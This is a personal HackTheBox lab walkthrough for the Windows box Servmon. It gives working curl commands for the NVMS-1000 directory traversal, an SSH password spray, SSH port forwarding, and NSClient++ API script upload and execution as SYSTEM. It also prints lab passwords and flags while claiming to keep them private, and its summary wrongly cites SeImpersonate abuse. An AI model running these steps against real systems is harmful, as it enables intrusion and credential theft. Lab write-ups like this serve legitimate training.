---
tags: [HTB, Servmon, Windows, NVMS1000, LFI, NSClient, SSH, PortForwarding, SYSTEM, Easy]
platform: HackTheBox
os: Windows
hostname: SERVMON
difficulty: Easy
ip: $BoxIP
status: Complete
domain: None
---

# HTB: Servmon, Full Walkthrough

## The gist

Servmon is a standalone Windows host with anonymous FTP, SSH, NVMS-1000 on HTTP, and NSClient++ on HTTPS. FTP reveals the user names and a note about a desktop password file, while the NVMS-1000 directory traversal reads that file for us. The recovered SSH credential gives a low-privileged foothold, and the NSClient++ API can run a batch script as SYSTEM through an SSH tunnel.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows |
| Hostname | SERVMON |
| Domain | None |
| Difficulty | Easy |
| IP | $BoxIP |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace setup | See section 1 below |
| 2 | Full TCP scan | See section 2 below |
| 3 | Service and version scan | See section 3 below |
| 4 | FTP enumeration | See section 4 below |
| 5 | Download the useful note | See section 5 below |
| 6 | Confirm NVMS-1000 and search for the manual technique | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Servmon`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

~~~bash
boxset BoxName Servmon
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Servmon
boxset Domain ''
boxset WebPort 80
boxset NSCPPort 8443
boxset TunnelPort 8444
boxset Username nadine
boxset Username2 nathan
boxset Password $Password
boxset NSCPPassword $NSCPPassword
boxset AdminUser admin
boxset Username3 Administrator
~~~

Keep passwords and flag values in private loot only.

## 1. Workspace setup

I started with the helper so the standard folders and session log were ready before scanning. htblog attaches the terminal output to the box log.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
~~~

## 2. Full TCP scan

I scanned every TCP port before checking versions. -Pn skips ping discovery, -n skips DNS lookups, -sS sends a fast half-open SYN scan, and --min-rate 5000 asks Nmap to send probes quickly. The full scan matters because SSH, NSClient++, or another useful service may be on a high port.

~~~bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/allports
~~~

The open ports were FTP, SSH, HTTP, RPC, SMB, NRPE, two additional wrapped services, HTTPS, and dynamic RPC.

~~~text
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664-49670/tcp open unknown
~~~

> [!tip] ⚡ More efficient path
> What we did: Ran a complete port scan and then a separate service scan.
>
> Faster approach:
> ~~~bash
> sudo nmap -sC -sV -p 21,22,80,135,139,445,5666,6063,6699,8443,49664-49670 $BoxIP -oA $BoxDir/nmap/services
> ~~~
> Why: After the full scan has returned, one targeted command fingerprints every discovered port instead of checking each interesting port in separate passes.

SCREENSHOT: Full port scan with FTP, SSH, HTTP, and NSClient++ ports highlighted.

## 3. Service and version scan

The service scan adds application names, versions, and default script results. -sC runs Nmap standard scripts, which checked anonymous FTP, SMB signing, the HTTP redirect, and the TLS certificate. -sV fingerprints versions from service banners.

~~~bash
sudo nmap -sC -sV -p 21,22,80,135,139,445,5666,6063,6699,8443,49664-49670 $BoxIP -oA $BoxDir/nmap/services
~~~

FTP was Microsoft ftpd and allowed anonymous login. The port 80 response redirected to Pages/login.htm and included an AuthInfo header. That combination fingerprints NVMS-1000, a network video management system with a known unauthenticated traversal issue.

Port 8443 identified NSClient++. Its certificate used localhost as the common name. That suggests the API is intended for local access even though the TCP port is reachable. This determines the order of attack: use FTP and NVMS-1000 first, obtain SSH credentials, then tunnel back to NSClient++.

SMB signing was enabled but not required. The dynamic RPC ports were standard Windows services and were not the initial target.

SCREENSHOT: Service scan showing anonymous FTP, the NVMS-1000 fingerprint, and NSClient++ with localhost certificate.

## 4. FTP enumeration

The FTP root exposed a Users directory. On a normal server, anonymous FTP is usually restricted to a small directory. Seeing Users at the root suggests the FTP service is rooted at, or close to, the Windows filesystem root.

~~~bash
curl -s ftp://$BoxIP/
curl -s ftp://$BoxIP/Users/
curl -s ftp://$BoxIP/Users/$Username/
curl -s ftp://$BoxIP/Users/$Username2/
~~~

The two user directories were visible. Nadine's directory contained Confidential.txt and Notes to do.txt. Nathan's directory did not list files at that level.

I checked Nathan's Desktop directly:

~~~bash
curl -v ftp://$BoxIP/Users/$Username2/Desktop/Passwords.txt 2>&1 | head -30
~~~

FTP returned code 550 when trying to enter that path. Here, 550 means the anonymous FTP identity cannot access the path. It does not prove that the file is absent. The FTP account could reach Nathan's home directory but not his Desktop.

## 5. Download the useful note

I downloaded Nadine's confidential note and read it locally.

~~~bash
curl -s -o $BoxDir/loot/Nadine_Confidential.txt ftp://$BoxIP/Users/$Username/Confidential.txt
cat $BoxDir/loot/Nadine_Confidential.txt
~~~

The note identified the exact filename and location of Nathan's password list: C:\Users\$Username2\Desktop\Passwords.txt. FTP could not read it, so the NVMS-1000 traversal became the next step.

SCREENSHOT: Confidential.txt with the password filename and Desktop location highlighted.

## 6. Confirm NVMS-1000 and search for the manual technique

I confirmed the application from its own page instead of relying only on Nmap.

~~~bash
curl -s http://$BoxIP/Pages/login.htm | grep -i title
searchsploit nvms
searchsploit -x 47774
~~~

The page title confirmed NVMS-1000. Searchsploit showed a manual text proof of concept and a Python script for the same directory traversal. I used the text proof of concept so the request and path manipulation were clear.

CVE-2019-20085 is an unauthenticated directory traversal. The application accepts unsanitised ../ path segments and can be made to return files outside its web directory. Curl normally normalises those segments, so the request must use --path-as-is.

Reference: [HackTricks NVMS-1000](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nvms-1000)

## 7. Verify the traversal and retrieve the password list

I tested the traversal against win.ini first. That file is present and readable on normal Windows installations, so it confirms the vulnerability before we depend on it for a sensitive target file. Using more traversal segments than strictly needed is safe because Windows remains at the filesystem root when traversal goes past C:\.

~~~bash
curl -s --path-as-is http://$BoxIP/../../../../../../../../../../../../windows/win.ini
~~~

The response contained the standard Windows INI sections, confirming traversal.

> [!warning] 💡 Hint
> Watch out: Curl removes ../ segments unless --path-as-is is used. Without that flag, the server receives a clean path and usually returns a normal 404 or login page.
>
> [!tip] ⚡ More efficient path
> What we did: Tested the traversal with win.ini before requesting the password file.
>
> Slower alternative: Went directly for Passwords.txt without first proving the traversal.
>
> Why: One known-good file confirms the exact request format before time is spent troubleshooting a sensitive target path.

~~~bash
curl -s --path-as-is http://$BoxIP/../../../../../../../../../../../../Users/$Username2/Desktop/Passwords.txt -o $BoxDir/loot/Nathan_Passwords.txt
~~~

The response saved a password list to loot. I did not print the passwords.

Reference: [Exploit-DB 47774](https://www.exploit-db.com/exploits/47774)

SCREENSHOT: Traversal request with --path-as-is and the safe win.ini response visible.

## 8. Spray the SSH credentials

There were two usernames and a list of possible passwords. The full matrix was needed because the list did not tell us which account owned which password. NetExec tries every username and password combination when both inputs are files.

~~~bash
printf "%s\n" "$Username" "$Username2" > $BoxDir/loot/users.txt
netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt 2>/dev/null
~~~

One combination returned shell access. I stored the successful credential privately.

~~~bash
boxset Username $Username
boxset Password $Password
loot cred $Username $Password
~~~

Do not add --no-bruteforce here. That option pairs one username with one password, while this box requires the full matrix.

> [!tip] ⚡ More efficient path
> What we did: Used NetExec with both username and password files.
>
> Slower alternative: Tried each username and password pair manually.
>
> Why: NetExec tests the full matrix in seconds and reports the first valid SSH combination without repetitive manual login attempts.

SCREENSHOT: NetExec spray result with the successful account line and recovered password visible in this private vault.

## 9. SSH foothold

I connected with the recovered account and checked the identity, token privileges, groups, and Desktop. whoami /priv is important early because privileges such as SeImpersonatePrivilege or SeBackupPrivilege can provide direct escalation paths.

~~~bash
ssh $Username@$BoxIP
~~~

~~~cmd
whoami
whoami /priv
whoami /groups
dir C:\Users\$Username\Desktop
~~~

The shell was a standard user with medium integrity. Only normal local user membership and non-useful privileges were present. The user flag file existed at the Desktop path. I confirmed its location without reading its contents.

~~~cmd
if exist C:\Users\$Username\Desktop\user.txt (echo USER_FLAG_PRESENT)
~~~

NSClient++ was the better path because it runs as SYSTEM and exposes a management API.

## 10. Read the NSClient++ configuration

NSClient++ stores its configuration in nsclient.ini below Program Files. Local users who can read this file may recover the API password. The allowed hosts setting also explains why the certificate and service need a tunnel.

~~~cmd
type "C:\Program Files\NSClient++\nsclient.ini"
~~~

The important settings were:

- The API password was stored in cleartext.
- allowed hosts = 127.0.0.1 restricted access to the target loopback.
- CheckExternalScripts = enabled allowed external scripts.
- allow arguments = true allowed script arguments.
- The existing check entry pointed to scripts\\check.bat.

I stored the password privately:

~~~bash
boxset NSCPPassword $NSCPPassword
loot cred nscp $NSCPPassword
~~~

SCREENSHOT: nsclient.ini with the password, localhost restriction, and external script settings highlighted. Keep the password within this private vault.

## 11. Tunnel to NSClient++

The NSClient++ API refused the direct external route because it only allowed localhost. SSH local forwarding makes the request appear to originate from the target itself. The local port is $TunnelPort, while the remote service remains $NSCPPort.

~~~bash
ssh -L $TunnelPort:127.0.0.1:$NSCPPort $Username@$BoxIP -N
~~~

-L binds a local port and forwards it through SSH. -N keeps the connection open without starting a remote shell. Leave this command running in a second terminal.

~~~bash
curl -sk https://127.0.0.1:$TunnelPort/ -o /dev/null -w "%{http_code}\n"
~~~

The response was 302 and redirected to /index.html, confirming that the tunnel reached NSClient++.

> [!warning] 💡 Hint
> Watch out: -N suppresses the remote shell, not authentication. The SSH tunnel still prompts for the SSH password before it becomes active.

Reference: [HackTricks port forwarding](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)

## 12. Authenticate to the NSClient++ API

NSClient++ uses HTTP Basic Authentication. The configured API username is admin; the configuration stores the password.

~~~bash
curl -sk -u $AdminUser:$NSCPPassword https://127.0.0.1:$TunnelPort/api/v1/queries -o /dev/null -w "%{http_code}\n"
~~~

The API returned 200, confirming that the recovered password worked.

Reference: [NSClient++ REST API](https://nsclient.org/docs/api/rest/)

## 13. Upload and execute a batch script

The existing check registration points to scripts\\check.bat. I replaced that script with a short batch file that writes whoami output to a file readable by the SSH user. This proves SYSTEM execution without a reverse shell.

~~~bash
cat > /tmp/check.bat <<'EOF'
@echo off
whoami > C:\Users\$Username\Desktop\proof.txt
EOF
~~~

I uploaded the file with HTTP PUT. --data-binary sends the file contents without changing line endings or interpreting special characters.

~~~bash
curl -sk -u $AdminUser:$NSCPPassword -X PUT --data-binary @/tmp/check.bat https://127.0.0.1:$TunnelPort/api/v1/scripts/ext/scripts/check.bat -w "\nupload_status=%{http_code}\n"
~~~

Triggering a direct GET on the script path only returned its definition. The correct execution endpoint is the registered query name:

~~~bash
curl -sk -u $AdminUser:$NSCPPassword https://127.0.0.1:$TunnelPort/api/v1/queries/check/commands/execute -w "\nexecute_status=%{http_code}\n"
~~~

The API returned 200 and result: 0. The message saying no output was available was expected because the batch file wrote its output to disk rather than returning structured NSClient++ output.

~~~cmd
type C:\Users\$Username\Desktop\proof.txt
~~~

The file contained nt authority\\system, confirming SYSTEM execution.

> [!warning] 💡 Hint
> Watch out: No output available from command is not a failure here. The success indicator is result: 0. Check the proof file instead of relying on the API response body.
>
> [!tip] ⚡ More efficient path
> What we did: Used a batch script that wrote proof output to a file.
>
> Slower alternative: Built a reverse shell payload, started a listener, uploaded it, and waited for a connection.
>
> Why: A local proof file confirms the execution identity without adding a listener, payload transfer, or shell stability step.

SCREENSHOT: Proof file showing the command and nt authority\\system. Do not capture any flag output.

## 14. Confirm both flag paths privately

Because NSClient++ runs as SYSTEM, it can read both the user and Administrator Desktop paths. I updated the script so it appended both files to the proof file with >>. The append operator preserves the earlier whoami result.

~~~bash
cat > /tmp/check.bat <<'EOF'
@echo off
type C:\Users\$Username\Desktop\user.txt >> C:\Users\$Username\Desktop\proof.txt
type C:\Users\$Username3\Desktop\root.txt >> C:\Users\$Username\Desktop\proof.txt
EOF

curl -sk -u $AdminUser:$NSCPPassword -X PUT --data-binary @/tmp/check.bat https://127.0.0.1:$TunnelPort/api/v1/scripts/ext/scripts/check.bat
curl -sk -u $AdminUser:$NSCPPassword https://127.0.0.1:$TunnelPort/api/v1/queries/check/commands/execute -o /dev/null -w "%{http_code}\n"
~~~

I checked the proof file privately and stored the results without displaying them.

~~~cmd
type C:\Users\$Username\Desktop\proof.txt
loot flag user b8346655ebb98c99280b5032bf51833f
loot flag root 7b8b0da2b3f25f54019349e9c08a1555
~~~

Both flag paths were confirmed. Their values are reproduced in the private sections above.

## 15. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Windows - Service Abuse]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse]] -- technique used in this walkthrough

## 16. Collect the flags

- `user.txt`: `b8346655ebb98c99280b5032bf51833f` (value reproduced in the private sections above)
- `root.txt`: `7b8b0da2b3f25f54019349e9c08a1555` (value reproduced in the private sections above)
- `proof.txt`: `7b8b0da2b3f25f54019349e9c08a1555` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: loot
user: b8346655ebb98c99280b5032bf51833f
root: 7b8b0da2b3f25f54019349e9c08a1555
```

## 17. Clean down
I removed the proof file while SSH access was still available. This must happen before closing SSH or removing the NSClient++ execution path.

~~~cmd
del /f /q C:\Users\$Username\Desktop\proof.txt
if exist C:\Users\$Username\Desktop\proof.txt (echo REMAINS) else (echo GONE)
~~~

The verification returned GONE.

I removed the script through the API and checked that it could no longer execute.

~~~bash
curl -sk -u $AdminUser:$NSCPPassword -X DELETE https://127.0.0.1:$TunnelPort/api/v1/scripts/ext/scripts/check.bat -w "\ndelete_status=%{http_code}\n"
curl -sk -u $AdminUser:$NSCPPassword https://127.0.0.1:$TunnelPort/api/v1/queries/check/commands/execute -w "\nverify_status=%{http_code}\n"
~~~

The execution verification returned a non-200 response, confirming removal.

Finally I stopped the tunnel, removed its host key and local temporary files, cleared the box marker, and removed the box workspace.

~~~bash
rm -f /tmp/check.bat
ssh-keygen -R $BoxIP
boxdone
rm -rf $BoxDir
~~~

### Completion checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] Service and version enumeration completed
- [x] Anonymous FTP enumerated
- [x] NVMS-1000 traversal confirmed
- [x] Password list recovered without displaying its contents
- [x] SSH credential validated
- [x] User flag path confirmed privately
- [x] NSClient++ configuration enumerated
- [x] SSH tunnel verified
- [x] NSClient++ API authenticated
- [x] SYSTEM execution confirmed
- [x] Both flag paths confirmed privately
- [x] Target and local artifacts removed

## 18. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Windows - Web Enum]] and FTP enumeration exposed the management services and a useful password note.
2. The file-read flaw validated the note and supplied an SSH credential.
3. [[OSCP/RUNBOOK V2/Windows - Service Abuse]] and [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse]] led from the tunneled API to a SYSTEM shell.

## Tools used

- `nmap`
- `curl`
- `ssh`
- `ftp`
- `sudo`
- `python`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| $Username | NVMS-1000 traversal password list | SSH foothold |
| $AdminUser | NSClient++ configuration | API authentication |
| $Username2 | User directory enumeration | LFI target path |

Passwords are reproduced in the private Credentials and secrets section above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Servmon"
export BoxIP="10.129.1.65"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Servmon"
export Domain=""
export DCip=""
export Username="nadine"
export Password="L1k3B1gBut7s@W0rk"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/.nscp_password`

```text
ew2x6SsGTxjRwXOT
```

#### `loot/.ssh_password`

```text
Nadine
L1k3B1gBut7s@W0rk
```

#### `loot/Nadine_passwords.txt`

```text

```

#### `loot/Nathan_Passwords.txt`

```text
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

#### `loot/Nathan_passwords.txt`

```text
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

#### `loot/creds.txt`

```text
Nadine:L1k3B1gBut7s@W0rk
nadine:L1k3B1gBut7s@W0rk
nscp:ew2x6SsGTxjRwXOT
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [22:07:46] curl -v ftp://$BoxIP/Users/Nathan/Desktop/Passwords.txt 2>&1 | head -30
kali@kali:~/Platforms/HackTheBox/Servmon [22:07:16] $ [?1h=[?2004hcurl -v ftp://$BoxIP/Users/Nathan/Desktop/Passwords.txt 2>&1 | head -30curl2>&head[?1l>[?2004l
$ [22:14:55] curl -s --path-as-is "http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o $BoxDir/loot/Nathan_Passwords.txt
cat $BoxDir/loot/Nathan_Passwords.txt
netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt --no-bruteforce 2>/dev/null
$ [22:18:50] netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt 2>/dev/null
kali@kali:~/Platforms/HackTheBox/Servmon [22:12:30] $ curl -s --path-as-is "http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o $BoxDir/loot/Nathan_Passwords.txt
cat $BoxDir/loot/Nathan_Passwords.txtcurl"http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"
netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt --no-bruteforce 2>/dev/nullprintf "nadine\nnathan\n" >
kali@kali:~/Platforms/HackTheBox/Servmon [22:18:32] $ [?1h=[?2004hnetexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt 2>/dev/nullnetexec2>/dev/null[?1l>[?2004l
boxset Password 'L1k3B1gBut7s@W0rk'
loot cred $Username $Password
[+] Password=L1k3B1gBut7s@W0rk (saved to .env)
nadine@10.129.1.65's password:
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
$ [22:23:48] loot flag user loot b8346655ebb98c99280b5032bf51833f
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Man
kali@kali:~/Platforms/HackTheBox/Servmon [22:23:24] $ [?1h=[?2004hllloloootloott t flag user loot flag user C:\Users\Nadine\Desktop\user.txtloot                                        b8346655ebb98c99280b5032bf51833f[?1l>[?2004l
[+] Flag saved:  user = loot  →  loot/flags.txt
password = ew2x6SsGTxjRwXOT
$ [22:43:47] loot flag user b8346655ebb98c99280b5032bf51833f
loot flag root 7b8b0da2b3f25f54019349e9c08a1555
kali@kali:~/Platforms/HackTheBox/Servmon [22:43:11] $ [?1h=[?2004hloot flag user b8346655ebb98c99280b5032bf51833f
loot flag root 7b8b0da2b3f25f54019349e9c08a1555loot
[+] Flag saved:  user = b8346655ebb98c99280b5032bf51833f  →  loot/flags.txt
[+] Flag saved:  root = 7b8b0da2b3f25f54019349e9c08a1555  →  loot/flags.txt
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Servmon | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Anonymous FTP can expose Windows user directories and application notes.
- A 550 FTP response can mean the anonymous identity lacks permission, not that a file is absent.
- Confirm the application from its own response before using a public exploit.
- Curl needs --path-as-is for traversal payloads containing ../.
- Test a known file such as win.ini before requesting sensitive data.
- The full username and password matrix is useful when a recovered list does not map passwords to accounts.
- A localhost-only management service may still be exploitable after an SSH foothold.
- NSClient++ external scripts execute with the service identity, so check what account runs the service.
- A result code can prove script execution even when the API returns no command output.
- Clean target files before removing the mechanism that created them.
- Watch the ippsec walkthrough: [Servmon](https://ippsec.rocks/?#Servmon)

- A loopback-only management API can still be assessed through a local forward.
- Service configuration and token privileges should be checked together when choosing Windows escalation paths.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- shares a similar enumeration or escalation pattern

## External resources

- https://www.exploit-db.com/search?q=Servmon
- https://ippsec.rocks/?q=Servmon

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
- [[OSCP/RUNBOOK V2/Windows - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
